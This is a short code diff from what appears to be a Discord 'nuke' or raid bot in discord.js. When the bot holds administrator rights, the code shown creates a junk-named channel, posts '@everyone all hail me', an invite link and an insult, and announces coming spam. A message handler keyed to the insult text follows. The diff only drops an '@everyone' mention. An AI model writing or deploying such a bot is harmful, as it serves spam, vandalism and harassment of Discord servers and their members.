@@ -283,7 +283,7 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
            msg.guild.channels.create('⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰').then(p => {
                 p.send("@everyone all hail me")
                 p.send("https://discord.gg/hKVK9r7DGt @everyone")
-                p.send("kiss my disrespectful ass @everyone")
+                p.send("kiss my disrespectful ass")
                 p.send("wait 7 seconds for the spam btw")
              })
         setTimeout(() => { 
@@ -393,7 +393,7 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
  
  
  client.on('message', message => {
-   if(message.content === 'kiss my disrespectful ass @everyone') {
+   if(message.content === 'kiss my disrespectful ass') {
  if(message.channel.type === "dm") {return}
  if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !');
  return
